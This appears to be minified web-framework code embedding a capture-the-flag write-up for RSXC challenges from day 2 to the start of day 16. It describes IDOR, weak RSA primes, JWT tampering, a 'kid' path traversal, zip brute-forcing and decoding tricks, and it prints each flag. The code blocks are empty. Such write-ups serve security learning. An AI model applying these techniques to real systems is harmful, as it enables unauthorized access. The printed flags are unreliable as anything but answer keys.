Vg=o(Ye);Of=i(Vg,"[DAY 2] A magic word"),Vg.forEach(a),yg.forEach(a),Bc=k(s),Bs=t(s,"H3",{id:!0});var xg=o(Bs);Ze=t(xg,"A",{href:!0});var Ug=o(Ze);Ff=i(Ug,"Challenge"),Ug.forEach(a),xg.forEach(a),$c=k(s),Es=t(s,"BLOCKQUOTE",{});var of=o(Es);Ep=t(of,"P",{});var Rg=o(Ep);zf=i(Rg,"We have found a magical port that is listening on port 20002, maybe you can find todays flag there?"),Rg.forEach(a),Cf=k(of),Tp=t(of,"P",{});var Ng=o(Tp);Df=i(Ng,"rsxc.no:20002"),Ng.forEach(a),of.forEach(a),Qc=k(s),$s=t(s,"H3",{id:!0});var Wg=o($s);Je=t(Wg,"A",{href:!0});var Sg=o(Je);Yf=i(Sg,"Solution"),Sg.forEach(a),Wg.forEach(a),Lc=k(s),Y=t(s,"P",{});var cp=o(Y);Zf=i(cp,"We know that there is an open port at 20002, connecting to it using the tool "),yp=t(cp,"CODE",{});var Mg=o(yp);Jf=i(Mg,"netcat"),Mg.forEach(a),jf=i(cp,", we see that it takes in an input and outputs "),Vp=t(cp,"CODE",{});var Ig=o(Vp);Pf=i(Ig,'"That is not the byte I want!"'),Ig.forEach(a),Hf=i(cp," whenever the user writes in the wrong input."),cp.forEach(a),Kc=k(s),Qs=t(s,"PRE",{class:!0});var ST=o(Qs);ST.forEach(a),si=k(s),je=t(s,"P",{});var Og=o(je);Af=i(Og,"From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:"),Og.forEach(a),ai=k(s),Ls=t(s,"PRE",{class:!0});var MT=o(Ls);MT.forEach(a),ni=k(s),Ks=t(s,"P",{});var m3=o(Ks);Xf=i(m3,"The flag is "),xp=t(m3,"CODE",{});var Fg=o(xp);Gf=i(Fg,"RSXC{You_found_the_magic_byte_I_wanted_Good_job!}"),Fg.forEach(a),m3.forEach(a),ei=k(s),sa=t(s,"H2",{id:!0});var zg=o(sa);Pe=t(zg,"A",{href:!0});var Cg=o(Pe);qf=i(Cg,"[DAY 3] What does this mean?"),Cg.forEach(a),zg.forEach(a),ti=k(s),aa=t(s,"H3",{id:!0});var Dg=o(aa);He=t(Dg,"A",{href:!0});var Yg=o(He);Bf=i(Yg,"Challenge"),Yg.forEach(a),Dg.forEach(a),oi=k(s),Ae=t(s,"BLOCKQUOTE",{});var Zg=o(Ae);Xe=t(Zg,"P",{});var b3=o(Xe);$f=i(b3,`When looking for the prizes to this challenge we came across some text we can\u2019t understand, can you help us figure out what it means?
`),$=t(b3,"A",{href:!0,rel:!0,class:!0,target:!0});var Jg=o($);Qf=i(Jg,"https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),Jg.forEach(a),b3.forEach(a),Zg.forEach(a),pi=k(s),na=t(s,"H3",{id:!0});var jg=o(na);Ge=t(jg,"A",{href:!0});var Pg=o(Ge);Lf=i(Pg,"Solution"),Pg.forEach(a),jg.forEach(a),li=k(s),ea=t(s,"PRE",{class:!0});var IT=o(ea);IT.forEach(a),ci=k(s),ta=t(s,"P",{});var g3=o(ta);Kf=i(g3,"We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the \u201CMagic\u201D tool does finally give us the flag: "),Q=t(g3,"A",{href:!0,rel:!0,class:!0,target:!0});var Hg=o(Q);sh=i(Hg,"https://gchq.github.io/CyberChef/#recipe=From_Base64(\u2018A-Za-z0-9%2B/%3D\u2019,true)From_Base58(\u2018rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz\u2019,false)Bzip2_Decompress(false)From_Base85(\u2018!-u\u2019)From_Morse_Code(\u2018Space\u2019,\u2018Line%20feed\u2019)From_Hex(\u2018Auto\u2019)From_Base32(\u2018A-Z2-7%3D\u2019,false)"),Hg.forEach(a),g3.forEach(a),ii=k(s),Ts=t(s,"P",{});var pf=o(Ts);ah=i(pf,"The flag is "),Up=t(pf,"CODE",{});var Ag=o(Up);nh=i(Ag,"RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}"),Ag.forEach(a),eh=i(pf,"."),pf.forEach(a),ri=k(s),oa=t(s,"H2",{id:!0});var Xg=o(oa);qe=t(Xg,"A",{href:!0});var Gg=o(qe);th=i(Gg,"[DAY 4] 4 Bytes of XOR"),Gg.forEach(a),Xg.forEach(a),ui=k(s),pa=t(s,"H3",{id:!0});var qg=o(pa);Be=t(qg,"A",{href:!0});var Bg=o(Be);oh=i(Bg,"Challenge"),Bg.forEach(a),qg.forEach(a),ki=k(s),$e=t(s,"BLOCKQUOTE",{});var $g=o($e);Qe=t($g,"P",{});var v3=o(Qe);ph=i(v3,`The flag of the day can be found by xor\u2019ing our text with 4 bytes.
`),L=t(v3,"A",{href:!0,rel:!0,class:!0,target:!0});var Qg=o(L);lh=i(Qg,"https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),Qg.forEach(a),v3.forEach(a),$g.forEach(a),fi=k(s),la=t(s,"H3",{id:!0});var Lg=o(la);Le=t(Lg,"A",{href:!0});var Kg=o(Le);ch=i(Kg,"Solution"),Kg.forEach(a),Lg.forEach(a),hi=k(s),ys=t(s,"P",{});var lf=o(ys);ih=i(lf,"We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known "),Rp=t(lf,"CODE",{});var sv=o(Rp);rh=i(sv,"RSXC{"),sv.forEach(a),uh=i(lf,", we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:"),lf.forEach(a),di=k(s),ca=t(s,"PRE",{class:!0});var OT=o(ca);OT.forEach(a),mi=k(s),ia=t(s,"P",{});var _3=o(ia);kh=i(_3,"The flag is "),Np=t(_3,"CODE",{});var av=o(Np);fh=i(av,"RSXC{Most_would_say_XOR_isn't_that_useful_anymore}"),av.forEach(a),_3.forEach(a),bi=k(s),ra=t(s,"H2",{id:!0});var nv=o(ra);Ke=t(nv,"A",{href:!0});var ev=o(Ke);hh=i(ev,"[DAY 5] Plain discussion"),ev.forEach(a),nv.forEach(a),gi=k(s),ua=t(s,"H3",{id:!0});var tv=o(ua);st=t(tv,"A",{href:!0});var ov=o(st);dh=i(ov,"Challenge"),ov.forEach(a),tv.forEach(a),vi=k(s),at=t(s,"BLOCKQUOTE",{});var pv=o(at);nt=t(pv,"P",{});var w3=o(nt);mh=i(w3,`A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
`),K=t(w3,"A",{href:!0,rel:!0,class:!0,target:!0});var lv=o(K);bh=i(lv,"https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),lv.forEach(a),w3.forEach(a),pv.forEach(a),_i=k(s),ka=t(s,"H3",{id:!0});var cv=o(ka);et=t(cv,"A",{href:!0});var iv=o(et);gh=i(iv,"Solution"),iv.forEach(a),cv.forEach(a),wi=k(s),tt=t(s,"P",{});var rv=o(tt);vh=i(rv,"We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first."),rv.forEach(a),Ei=k(s),fa=t(s,"PRE",{class:!0});var FT=o(fa);FT.forEach(a),Ti=k(s),Vs=t(s,"P",{});var cf=o(Vs);_h=i(cf,"Following that I stringed for "),Wp=t(cf,"CODE",{});var uv=o(Wp);wh=i(uv,"flag"),uv.forEach(a),Eh=i(cf," which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely."),cf.forEach(a),yi=k(s),ha=t(s,"PRE",{class:!0});var zT=o(ha);zT.forEach(a),Vi=k(s),ot=t(s,"P",{});var kv=o(ot);Th=i(kv,"From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:"),kv.forEach(a),xi=k(s),da=t(s,"PRE",{class:!0});var CT=o(da);CT.forEach(a),Ui=k(s),ma=t(s,"P",{});var E3=o(ma);yh=i(E3,"The flag is "),Sp=t(E3,"CODE",{});var fv=o(Sp);Vh=i(fv,"RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}"),fv.forEach(a),E3.forEach(a),Ri=k(s),ba=t(s,"H2",{id:!0});var hv=o(ba);pt=t(hv,"A",{href:!0});var dv=o(pt);xh=i(dv,"[DAY 6] The indecipherable cipher"),dv.forEach(a),hv.forEach(a),Ni=k(s),ga=t(s,"H3",{id:!0});var mv=o(ga);lt=t(mv,"A",{href:!0});var bv=o(lt);Uh=i(bv,"Challenge"),bv.forEach(a),mv.forEach(a),Wi=k(s),ct=t(s,"BLOCKQUOTE",{});var gv=o(ct);it=t(gv,"P",{});var T3=o(it);Rh=i(T3,`We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
`),ss=t(T3,"A",{href:!0,rel:!0,class:!0,target:!0});var vv=o(ss);Nh=i(vv,"https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),vv.forEach(a),T3.forEach(a),gv.forEach(a),Si=k(s),va=t(s,"H3",{id:!0});var _v=o(va);rt=t(_v,"A",{href:!0});var wv=o(rt);Wh=i(wv,"Solution"),wv.forEach(a),_v.forEach(a),Mi=k(s),_a=t(s,"FIGURE",{class:!0});var Ev=o(_a);Mp=t(Ev,"IMG",{src:!0}),Ev.forEach(a),Ii=k(s),wa=t(s,"P",{});var y3=o(wa);Sh=i(y3,"The flag is "),Ip=t(y3,"CODE",{});var Tv=o(Ip);Mh=i(Tv,"RSXC{isthisnotjustafancycaesarcipher}"),Tv.forEach(a),y3.forEach(a),Oi=k(s),Ea=t(s,"H2",{id:!0});var yv=o(Ea);ut=t(yv,"A",{href:!0});var Vv=o(ut);Ih=i(Vv,"[DAY 7] This is quite meta"),Vv.forEach(a),yv.forEach(a),Fi=k(s),Ta=t(s,"H3",{id:!0});var xv=o(Ta);kt=t(xv,"A",{href:!0});var Uv=o(kt);Oh=i(Uv,"Challenge"),Uv.forEach(a),xv.forEach(a),zi=k(s),ft=t(s,"BLOCKQUOTE",{});var Rv=o(ft);ht=t(Rv,"P",{});var V3=o(ht);Fh=i(V3,`We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
`),as=t(V3,"A",{href:!0,rel:!0,class:!0,target:!0});var Nv=o(as);zh=i(Nv,"https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),Nv.forEach(a),V3.forEach(a),Rv.forEach(a),Ci=k(s),ya=t(s,"H3",{id:!0});var Wv=o(ya);dt=t(Wv,"A",{href:!0});var Sv=o(dt);Ch=i(Sv,"Solution"),Sv.forEach(a),Wv.forEach(a),Di=k(s),mt=t(s,"P",{});var Mv=o(mt);Dh=i(Mv,"We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:"),Mv.forEach(a),Yi=k(s),Va=t(s,"PRE",{class:!0});var DT=o(Va);DT.forEach(a),Zi=k(s),xa=t(s,"FIGURE",{class:!0});var Iv=o(xa);Op=t(Iv,"IMG",{src:!0}),Iv.forEach(a),Ji=k(s),Ua=t(s,"P",{});var x3=o(Ua);Yh=i(x3,"The flag is: "),Fp=t(x3,"CODE",{});var Ov=o(Fp);Zh=i(Ov,"RSXC{Sometimes_metadata_hides_stuff}"),Ov.forEach(a),x3.forEach(a),ji=k(s),Ra=t(s,"H2",{id:!0});var Fv=o(Ra);bt=t(Fv,"A",{href:!0});var zv=o(bt);Jh=i(zv,"[DAY 8] The reference"),zv.forEach(a),Fv.forEach(a),Pi=k(s),Na=t(s,"H3",{id:!0});var Cv=o(Na);gt=t(Cv,"A",{href:!0});var Dv=o(gt);jh=i(Dv,"Challenge"),Dv.forEach(a),Cv.forEach(a),Hi=k(s),vt=t(s,"BLOCKQUOTE",{});var Yv=o(vt);_t=t(Yv,"P",{});var U3=o(_t);Ph=i(U3,`I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
`),ns=t(U3,"A",{href:!0,rel:!0,class:!0,target:!0});var Zv=o(ns);Hh=i(Zv,"http://rsxc.no:20008"),Zv.forEach(a),U3.forEach(a),Yv.forEach(a),Ai=k(s),Wa=t(s,"H3",{id:!0});var Jv=o(Wa);wt=t(Jv,"A",{href:!0});var jv=o(wt);Ah=i(jv,"Solution"),jv.forEach(a),Jv.forEach(a),Xi=k(s),V=t(s,"P",{});var B=o(V);Xh=i(B,"We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request "),zp=t(B,"CODE",{});var Pv=o(zp);Gh=i(Pv,"id"),Pv.forEach(a),qh=i(B," of that note number: "),Cp=t(B,"CODE",{});var Hv=o(Cp);Bh=i(Hv,"http://rsxc.no:20008/notes.php?id=2"),Hv.forEach(a),$h=i(B,". By directly changing the value of "),Dp=t(B,"CODE",{});var Av=o(Dp);Qh=i(Av,"id"),Av.forEach(a),Lh=i(B," and the url to "),Yp=t(B,"CODE",{});var Xv=o(Yp);Kh=i(Xv,"http://rsxc.no:20008/notes.php?id=0"),Xv.forEach(a),sd=i(B," we receive the flag."),B.forEach(a),Gi=k(s),Sa=t(s,"P",{});var R3=o(Sa);ad=i(R3,"The flag is: "),Zp=t(R3,"CODE",{});var Gv=o(Zp);nd=i(Gv,"RSXC{Remember_to_secure_your_direct_object_references}"),Gv.forEach(a),R3.forEach(a),qi=k(s),Ma=t(s,"H2",{id:!0});var qv=o(Ma);Et=t(qv,"A",{href:!0});var Bv=o(Et);ed=i(Bv,"[DAY 9] The reference 2"),Bv.forEach(a),qv.forEach(a),Bi=k(s),Ia=t(s,"H3",{id:!0});var $v=o(Ia);Tt=t($v,"A",{href:!0});var Qv=o(Tt);td=i(Qv,"Challenge"),Qv.forEach(a),$v.forEach(a),$i=k(s),yt=t(s,"BLOCKQUOTE",{});var Lv=o(yt);Vt=t(Lv,"P",{});var N3=o(Vt);od=i(N3,`I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
`),es=t(N3,"A",{href:!0,rel:!0,class:!0,target:!0});var Kv=o(es);pd=i(Kv,"http://rsxc.no:20009"),Kv.forEach(a),N3.forEach(a),Lv.forEach(a),Qi=k(s),Oa=t(s,"H3",{id:!0});var s_=o(Oa);xt=t(s_,"A",{href:!0});var a_=o(xt);ld=i(a_,"Solution"),a_.forEach(a),s_.forEach(a),Li=k(s),Fa=t(s,"FIGURE",{class:!0});var n_=o(Fa);Jp=t(n_,"IMG",{src:!0}),n_.forEach(a),Ki=k(s),Ut=t(s,"P",{});var e_=o(Ut);cd=i(e_,"Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for \u201Cnote0\u201D:"),e_.forEach(a),sr=k(s),za=t(s,"PRE",{class:!0});var YT=o(za);YT.forEach(a),ar=k(s),Z=t(s,"P",{});var ip=o(Z);id=i(ip,"Navigating to the note with that id ("),ts=t(ip,"A",{href:!0,rel:!0,class:!0,target:!0});var t_=o(ts);rd=i(t_,"http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),t_.forEach(a),ud=i(ip,") did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word "),jp=t(ip,"CODE",{});var o_=o(jp);kd=i(o_,"flag"),o_.forEach(a),fd=i(ip,". Doing the same steps as above and navigating to the note using this new note id gives us the flag:"),ip.forEach(a),nr=k(s),Ca=t(s,"PRE",{class:!0});var ZT=o(Ca);ZT.forEach(a),er=k(s),Da=t(s,"P",{});var W3=o(Da);hd=i(W3,"The flag is: "),Pp=t(W3,"CODE",{});var p_=o(Pp);dd=i(p_,"RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}"),p_.forEach(a),W3.forEach(a),tr=k(s),Ya=t(s,"H2",{id:!0});var l_=o(Ya);Rt=t(l_,"A",{href:!0});var c_=o(Rt);md=i(c_,"[DAY 10] Lookup"),c_.forEach(a),l_.forEach(a),or=k(s),Za=t(s,"H3",{id:!0});var i_=o(Za);Nt=t(i_,"A",{href:!0});var r_=o(Nt);bd=i(r_,"Challenge"),r_.forEach(a),i_.forEach(a),pr=k(s),Wt=t(s,"BLOCKQUOTE",{});var u_=o(Wt);St=t(u_,"P",{});var S3=o(St);gd=i(S3,`Sometimes you need to look up to get the answer you need.
`),os=t(S3,"A",{href:!0,rel:!0,class:!0,target:!0});var k_=o(os);vd=i(k_,"http://rsxc.no:20010"),k_.forEach(a),S3.forEach(a),u_.forEach(a),lr=k(s),Ja=t(s,"H3",{id:!0});var f_=o(Ja);Mt=t(f_,"A",{href:!0});var h_=o(Mt);_d=i(h_,"Solution"),h_.forEach(a),f_.forEach(a),cr=k(s),J=t(s,"P",{});var rp=o(J);wd=i(rp,"Navigating to the page we see an input field telling us to \u201Clookup\u201D. After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running "),Hp=t(rp,"CODE",{});var d_=o(Hp);Ed=i(d_,"dig"),d_.forEach(a),Td=i(rp,", "),Ap=t(rp,"CODE",{});var m_=o(Ap);yd=i(m_,"nslookup"),m_.forEach(a),Vd=i(rp," and so on didn\u2019t give me any useful results. After a while on a lucky guess I curl\u2019ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:"),rp.forEach(a),ir=k(s),ja=t(s,"PRE",{class:!0});var JT=o(ja);JT.forEach(a),rr=k(s),Pa=t(s,"P",{});var M3=o(Pa);xd=i(M3,"The flag is: "),Xp=t(M3,"CODE",{});var b_=o(Xp);Ud=i(b_,"RSXC{Sometimes_headers_can_tell_you_something_useful}"),b_.forEach(a),M3.forEach(a),ur=k(s),Ha=t(s,"H2",{id:!0});var g_=o(Ha);It=t(g_,"A",{href:!0});var v_=o(It);Rd=i(v_,"[DAY 11] The not so random prime"),v_.forEach(a),g_.forEach(a),kr=k(s),Aa=t(s,"H3",{id:!0});var __=o(Aa);Ot=t(__,"A",{href:!0});var w_=o(Ot);Nd=i(w_,"Challenge"),w_.forEach(a),__.forEach(a),fr=k(s),Ft=t(s,"BLOCKQUOTE",{});var E_=o(Ft);zt=t(E_,"P",{});var I3=o(zt);Wd=i(I3,`We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
`),ps=t(I3,"A",{href:!0,rel:!0,class:!0,target:!0});var T_=o(ps);Sd=i(T_,"https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),T_.forEach(a),I3.forEach(a),E_.forEach(a),hr=k(s),Xa=t(s,"H3",{id:!0});var y_=o(Xa);Ct=t(y_,"A",{href:!0});var V_=o(Ct);Md=i(V_,"Solution"),V_.forEach(a),y_.forEach(a),dr=k(s),xs=t(s,"P",{});var rf=o(xs);Id=i(rf,"We are given a rsa encryption script and it\u2019s output. Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: "),Gp=t(rf,"CODE",{});var x_=o(Gp);Od=i(x_,"q = nextprime(p * p)"),x_.forEach(a),Fd=i(rf," (meaning that q is generated with dependent on p)."),rf.forEach(a),mr=k(s),j=t(s,"P",{});var up=o(j);zd=i(up,"Knowing this, we know that N is approximately "),qp=t(up,"CODE",{});var U_=o(qp);Cd=i(U_,"p^3"),U_.forEach(a),Dd=i(up,", and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find "),Bp=t(up,"CODE",{});var R_=o(Bp);Yd=i(R_,"q"),R_.forEach(a),Zd=i(up," and then decrypt everything. A quick python script can be seen below:"),up.forEach(a),br=k(s),Ga=t(s,"PRE",{class:!0});var jT=o(Ga);jT.forEach(a),gr=k(s),qa=t(s,"P",{});var O3=o(qa);Jd=i(O3,"The flag is: "),$p=t(O3,"CODE",{});var N_=o($p);jd=i(N_,"RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}"),N_.forEach(a),O3.forEach(a),vr=k(s),Ba=t(s,"H2",{id:!0});var W_=o(Ba);Dt=t(W_,"A",{href:!0});var S_=o(Dt);Pd=i(S_,"[DAY 12] Twelve seconds of encoding"),S_.forEach(a),W_.forEach(a),_r=k(s),$a=t(s,"H3",{id:!0});var M_=o($a);Yt=t(M_,"A",{href:!0});var I_=o(Yt);Hd=i(I_,"Challenge"),I_.forEach(a),M_.forEach(a),wr=k(s),Zt=t(s,"BLOCKQUOTE",{});var O_=o(Zt);Qp=t(O_,"P",{});var F_=o(Qp);Ad=i(F_,`For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012`),F_.forEach(a),O_.forEach(a),Er=k(s),Qa=t(s,"H3",{id:!0});var z_=o(Qa);Jt=t(z_,"A",{href:!0});var C_=o(Jt);Xd=i(C_,"Solution"),C_.forEach(a),z_.forEach(a),Tr=k(s),jt=t(s,"P",{});var D_=o(jt);Gd=i(D_,"We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:"),D_.forEach(a),yr=k(s),La=t(s,"PRE",{class:!0});var PT=o(La);PT.forEach(a),Vr=k(s),Ka=t(s,"P",{});var F3=o(Ka);qd=i(F3,"The flag is: "),Lp=t(F3,"CODE",{});var Y_=o(Lp);Bd=i(Y_,"RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}"),Y_.forEach(a),F3.forEach(a),xr=k(s),sn=t(s,"H2",{id:!0});var Z_=o(sn);Pt=t(Z_,"A",{href:!0});var J_=o(Pt);$d=i(J_,"[DAY 13] New technology is hard"),J_.forEach(a),Z_.forEach(a),Ur=k(s),an=t(s,"H3",{id:!0});var j_=o(an);Ht=t(j_,"A",{href:!0});var P_=o(Ht);Qd=i(P_,"Challenge"),P_.forEach(a),j_.forEach(a),Rr=k(s),At=t(s,"BLOCKQUOTE",{});var H_=o(At);Xt=t(H_,"P",{});var z3=o(Xt);Ld=i(z3,`When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn\u2019t.
`),ls=t(z3,"A",{href:!0,rel:!0,class:!0,target:!0});var A_=o(ls);Kd=i(A_,"http://rsxc.no:20013"),A_.forEach(a),z3.forEach(a),H_.forEach(a),Nr=k(s),nn=t(s,"H3",{id:!0});var X_=o(nn);Gt=t(X_,"A",{href:!0});var G_=o(Gt);sm=i(G_,"Solution"),G_.forEach(a),X_.forEach(a),Wr=k(s),Us=t(s,"P",{});var uf=o(Us);am=i(uf,"Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file "),Kp=t(uf,"CODE",{});var q_=o(Kp);nm=i(q_,"Todos.js"),q_.forEach(a),em=i(uf,"."),uf.forEach(a),Sr=k(s),en=t(s,"PRE",{class:!0});var HT=o(en);HT.forEach(a),Mr=k(s),qt=t(s,"P",{});var B_=o(qt);tm=i(B_,"Decrypting it gives us the flag:"),B_.forEach(a),Ir=k(s),tn=t(s,"PRE",{class:!0});var AT=o(tn);AT.forEach(a),Or=k(s),on=t(s,"P",{});var C3=o(on);om=i(C3,"The flag is: "),sl=t(C3,"CODE",{});var $_=o(sl);pm=i($_,"RSXC{it_might_be_there_even_if_you_don't_include_it!}"),$_.forEach(a),C3.forEach(a),Fr=k(s),pn=t(s,"H2",{id:!0});var Q_=o(pn);Bt=t(Q_,"A",{href:!0});var L_=o(Bt);lm=i(L_,"[DAY 14] JWT"),L_.forEach(a),Q_.forEach(a),zr=k(s),ln=t(s,"H3",{id:!0});var K_=o(ln);$t=t(K_,"A",{href:!0});var s5=o($t);cm=i(s5,"Challenge"),s5.forEach(a),K_.forEach(a),Cr=k(s),Qt=t(s,"BLOCKQUOTE",{});var a5=o(Qt);Lt=t(a5,"P",{});var D3=o(Lt);im=i(D3,`Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
`),cs=t(D3,"A",{href:!0,rel:!0,class:!0,target:!0});var n5=o(cs);rm=i(n5,"http://rsxc.no:20014"),n5.forEach(a),D3.forEach(a),a5.forEach(a),Dr=k(s),cn=t(s,"H3",{id:!0});var e5=o(cn);Kt=t(e5,"A",{href:!0});var t5=o(Kt);um=i(t5,"Solution"),t5.forEach(a),e5.forEach(a),Yr=k(s),rn=t(s,"FIGURE",{class:!0});var o5=o(rn);al=t(o5,"IMG",{src:!0}),o5.forEach(a),Zr=k(s),so=t(s,"P",{});var p5=o(so);km=i(p5,"Navigating to the page with our new and tampered JWT cookie gives us the flag:"),p5.forEach(a),Jr=k(s),un=t(s,"PRE",{class:!0});var XT=o(un);XT.forEach(a),jr=k(s),kn=t(s,"P",{});var Y3=o(kn);fm=i(Y3,"The flag is: "),nl=t(Y3,"CODE",{});var l5=o(nl);hm=i(l5,"RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}"),l5.forEach(a),Y3.forEach(a),Pr=k(s),fn=t(s,"H2",{id:!0});var c5=o(fn);ao=t(c5,"A",{href:!0});var i5=o(ao);dm=i(i5,"[DAY 15] JWT 2"),i5.forEach(a),c5.forEach(a),Hr=k(s),hn=t(s,"H3",{id:!0});var r5=o(hn);no=t(r5,"A",{href:!0});var u5=o(no);mm=i(u5,"Challenge"),u5.forEach(a),r5.forEach(a),Ar=k(s),eo=t(s,"BLOCKQUOTE",{});var k5=o(eo);to=t(k5,"P",{});var Z3=o(to);bm=i(Z3,`I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
`),is=t(Z3,"A",{href:!0,rel:!0,class:!0,target:!0});var f5=o(is);gm=i(f5,"http://rsxc.no:20015"),f5.forEach(a),Z3.forEach(a),k5.forEach(a),Xr=k(s),dn=t(s,"H3",{id:!0});var h5=o(dn);oo=t(h5,"A",{href:!0});var d5=o(oo);vm=i(d5,"Solution"),d5.forEach(a),h5.forEach(a),Gr=k(s),f=t(s,"P",{});var b=o(f);_m=i(b,"This challenge seemed to be the same as day 15 but with just "),el=t(b,"CODE",{});var m5=o(el);wm=i(m5,"kid"),m5.forEach(a),Em=i(b,"-issues added. "),tl=t(b,"CODE",{});var b5=o(tl);Tm=i(b5,"kid"),b5.forEach(a),ym=i(b," is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the "),ol=t(b,"CODE",{});var g5=o(ol);Vm=i(g5,"kid"),g5.forEach(a),xm=i(b," file path check is used within php functions such as "),pl=t(b,"CODE",{});var v5=o(pl);Um=i(v5,"include"),v5.forEach(a),Rm=i(b," or "),ll=t(b,"CODE",{});var _5=o(ll);Nm=i(_5,"file_get_content"),_5.forEach(a),Wm=i(b," one could also inject the data in, reading the source. After much trial and error using the well known python "),rs=t(b,"A",{href:!0,rel:!0,class:!0,target:!0});var w5=o(rs);Sm=i(w5,"jwt_tool"),w5.forEach(a),Mm=i(b," for tampering with the token, we find that setting the "),cl=t(b,"CODE",{});var E5=o(cl);Im=i(E5,"kid"),E5.forEach(a),Om=i(b," value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the "),il=t(b,"CODE",{});var T5=o(il);Fm=i(T5,"kid"),T5.forEach(a),zm=i(b," value to "),rl=t(b,"CODE",{});var y5=o(rl);Cm=i(y5,"portal.php"),y5.forEach(a),Dm=i(b," (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:"),b.forEach(a),qr=k(s),mn=t(s,"PRE",{class:!0});var GT=o(mn);GT.forEach(a),Br=k(s),bn=t(s,"PRE",{class:!0});var qT=o(bn);qT.forEach(a),$r=k(s),gn=t(s,"P",{});var J3=o(gn);Ym=i(J3,"The flag is: "),ul=t(J3,"CODE",{});var V5=o(ul);Zm=i(V5,"RSXC{Don't_let_others_decide_where_your_keys_are_located}"),V5.forEach(a),J3.forEach(a),Qr=k(s),vn=t(s,"H2",{id:!0});var x5=o(vn);po=t(x5,"A",{href:!0});var U5=o(po);Jm=i(U5,"[DAY 16] A scary command"),U5.forEach(a),x5.forEach(a),Lr=k(s),_n=t(s,"H3",{id:!0});var R5=o(_n);lo=t(R5,"A",{href:!0});var N5=o(lo);jm=i(N5,"Challenge"),N5.forEach(a),R5.forEach(a),Kr=k(s),co=t(s,"BLOCKQUOTE",{});var W5=o(co);io=t(W5,"P",{});var j3=o(io);Pm=i(j3,`Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn\u2019t have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
